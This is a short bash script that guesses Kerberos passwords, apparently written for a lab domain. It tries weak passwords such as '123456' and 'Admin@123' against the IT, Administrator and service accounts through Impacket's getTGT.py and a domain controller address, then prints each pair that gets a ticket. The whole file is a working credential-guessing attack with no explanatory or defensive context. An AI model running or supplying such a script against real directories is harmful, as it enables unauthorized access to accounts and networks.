#!/bin/bash
DC=192.0.2.10
for account in IT Administrator service; do
  for candidate in 123456 password 'Admin@123'; do
    reply=$(timeout 4 getTGT.py "LAB/${account}:${candidate}" -dc-ip "$DC" 2>&1)
    if echo "$reply" | grep -q "Saving ticket"; then
      echo "VALID: ${account}:${candidate}"
    fi
  done
done
